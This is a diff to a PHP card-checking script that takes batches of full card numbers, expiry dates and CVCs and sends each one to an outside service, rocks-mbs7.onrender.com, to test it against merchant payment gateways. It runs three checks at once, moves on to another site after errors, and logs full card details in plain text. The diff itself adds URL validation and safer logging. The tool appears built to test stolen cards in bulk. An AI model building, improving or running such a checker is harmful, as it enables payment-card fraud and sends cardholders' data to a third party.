@@ -14,6 +14,19 @@ function log_message($message) {
     file_put_contents($log_file, date('Y-m-d H:i:s') . " - $message\n", FILE_APPEND);
 }
 
+// Function to validate a site URL
+function validateSite($site) {
+    // Normalize site URL
+    if (!preg_match('/^https?:\/\//i', $site)) {
+        $site = 'https://' . $site;
+    }
+    // Basic URL validation
+    if (!preg_match('/^(https?:\/\/)?([\w-]+\.)+[\w-]{2,}(\/.*)?$/', $site)) {
+        return false;
+    }
+    return $site;
+}
+
 // Function to check a single card on one site, moving to the next site only on error responses
 function checkCard($card_number, $exp_month, $exp_year, $cvc, $sites, $retry = 1) {
     $card_details = "$card_number|$exp_month|$exp_year|$cvc";
@@ -22,10 +35,13 @@ function checkCard($card_number, $exp_month, $exp_year, $cvc, $sites, $retry = 1
     ];
 
     foreach ($sites as $site) {
-        // Normalize site URL
-        if (!preg_match('/^https?:\/\//i', $site)) {
-            $site = 'https://' . $site;
+        // Validate and normalize site
+        $site = validateSite($site);
+        if ($site === false) {
+            log_message("Invalid site URL for $card_details: $site");
+            continue; // Skip invalid site
         }
+
         $encoded_cc = urlencode($card_details);
         $api_url = "https://rocks-mbs7.onrender.com/index.php?site=" . urlencode($site) . "&cc=$encoded_cc";
         log_message("Checking card: $card_details on site: $site, URL: $api_url");
@@ -44,7 +60,7 @@ function checkCard($card_number, $exp_month, $exp_year, $cvc, $sites, $retry = 1
             $curl_errno = curl_errno($ch);
             curl_close($ch);
 
-            log_message("Attempt " . ($attempt + 1) . " for $card_details on $site: HTTP $http_code, cURL errno $curl_errno, Response: " . substr($response, 0, 100));
+            log_message("Attempt " . ($attempt + 1) . " for $card_details on $site: HTTP $http_code, cURL errno $curl_errno, Response: " . substr($response ?: 'No response', 0, 100));
 
             // Handle API errors
             if ($response === false || $http_code !== 200 || !empty($curl_error)) {
@@ -67,7 +83,6 @@ function checkCard($card_number, $exp_month, $exp_year, $cvc, $sites, $retry = 1
             $response_text = trim($result['Response']);
             $gateway = htmlspecialchars($result['Gateway'], ENT_QUOTES, 'UTF-8');
             $price = htmlspecialchars($result['Price'], ENT_QUOTES, 'UTF-8');
-            $status = $result['Status']; // true or false, but we map based on Response
 
             // Check if it's an error response to move to next site
             $is_error = false;
@@ -99,7 +114,6 @@ function checkCard($card_number, $exp_month, $exp_year, $cvc, $sites, $retry = 1
 
             $response_msg = htmlspecialchars($response_text, ENT_QUOTES, 'UTF-8');
             log_message("$mapped_status for $card_details on $site: $response_msg (Gateway: $gateway, Price: $price)");
-            // Return immediately for non-error responses
             return "$mapped_status [$response_msg] (Gateway: $gateway, Price: $price) $card_details";
         }
     }
@@ -137,9 +151,14 @@ function processCardsInParallel($cards, $sites, $max_concurrent = 3) {
             }
 
             $site = $sites[$site_index];
-            if (!preg_match('/^https?:\/\//i', $site)) {
-                $site = 'https://' . $site;
+            $site = validateSite($site);
+            if ($site === false) {
+                log_message("Invalid site URL for card index $index: {$sites[$site_index]}, moving to next site");
+                $site_indices[$index]++;
+                $card_queue[] = ['index' => $index, 'card' => $cards[$index]];
+                continue;
             }
+
             $card_details = "{$card['number']}|{$card['exp_month']}|{$card['exp_year']}|{$card['cvc']}";
             $api_url = "https://rocks-mbs7.onrender.com/index.php?site=" . urlencode($site) . "&cc=" . urlencode($card_details);
             log_message("Queueing request for card index $index: $card_details on site: $site");
@@ -184,7 +203,7 @@ function processCardsInParallel($cards, $sites, $max_concurrent = 3) {
             $max_retry = $request['max_retry'];
 
             if ($response !== null || $curl_error || $http_code) {
-                log_message("Completed request for card index $card_index: $card_details on $site, HTTP $http_code, cURL errno $curl_errno, Response: " . substr($response, 0, 100));
+                log_message("Completed request for card index $card_index: $card_details on $site, HTTP $http_code, cURL errno $curl_errno, Response: " . substr($response ?: 'No response', 0, 100));
 
                 // Handle API errors
                 if ($response === false || $http_code !== 200 || !empty($curl_error)) {
@@ -287,6 +306,22 @@ $sites = $_POST['sites'];
 $required_fields = ['number', 'exp_month', 'exp_year', 'cvc'];
 $processed_cards = [];
 
+// Validate and normalize sites
+$valid_sites = [];
+foreach ($sites as $index => $site) {
+    $normalized_site = validateSite($site);
+    if ($normalized_site !== false) {
+        $valid_sites[] = $normalized_site;
+    } else {
+        log_message("Invalid site at index $index: $site");
+    }
+}
+if (empty($valid_sites)) {
+    log_message("No valid sites provided");
+    echo "ERROR [No valid sites provided]";
+    exit;
+}
+
 // Validate and normalize each card
 foreach ($cards as $index => $card) {
     // Validate card data
@@ -361,7 +396,7 @@ foreach ($cards as $index => $card) {
 }
 
 // Process cards in parallel with up to 3 concurrent requests
-$results = processCardsInParallel($processed_cards, $sites, 3);
+$results = processCardsInParallel($processed_cards, $valid_sites, 3);
 
 // Output results
 foreach ($results as $result) {
